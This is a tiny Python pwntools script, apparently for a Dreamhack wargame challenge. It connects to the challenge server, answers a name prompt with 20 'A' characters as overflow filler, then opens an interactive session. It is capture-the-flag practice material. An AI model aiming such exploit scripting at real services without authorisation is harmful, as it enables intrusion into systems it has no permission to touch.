from pwn import *

p = remote('host1.dreamhack.games', 14656)

p.recvuntil('Name: ')
p.send("A" * 20)

p.recvuntil('baby?')

p.interactive()
